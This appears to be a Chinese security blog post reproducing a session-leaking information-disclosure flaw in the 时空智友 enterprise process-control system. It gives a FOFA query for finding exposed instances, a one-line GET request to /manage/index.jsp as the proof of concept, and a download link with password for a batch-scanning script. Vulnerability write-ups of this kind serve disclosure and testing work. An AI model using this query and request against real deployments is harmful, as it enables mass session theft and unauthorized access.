# 原创
：  漏洞复现--时空智友企业流程化管控系统敏感信息泄露（POC）

# 漏洞复现--时空智友企业流程化管控系统敏感信息泄露（POC）

## 免责声明：

文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行承担！

### 一：漏洞描述

时空智友企业流程化管控系统是使用JAVA开发为企业提供流程化管控的一款系统。时空智友企业流程化管控系统存在敏感信息泄露，攻击者可通过此漏洞获取用户session以进行后续测试操作。<br/> 此漏洞由掌控安全学院 - wax 发布

### 二：漏洞影响版本

暂未公布

### 三：网络空间测绘查询

fofa: `"时空智友企业信息管理"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/5b1f5c281287a1eb3a73874bdca9fbc4.jpeg"/>

### 四：漏洞复现

poc<br/> `GET /manage/index.jsp`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/2667b3f118b21c0a8774c065c2b2e6d2.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/fe9cf385144bda5b69cf3f6f2e2ad2d6.jpeg"/>

### 五:批量检测

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/575e2ac30c908a6ad820e52d2052e222.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/a247a3801df1b21072d505d145e8d0be.jpeg"/><br/> 检测脚本下载地址：<br/> `https://pan.baidu.com/s/1zxKXP6Q_bz9x0P1gve57Jg`<br/> 密码cy7t
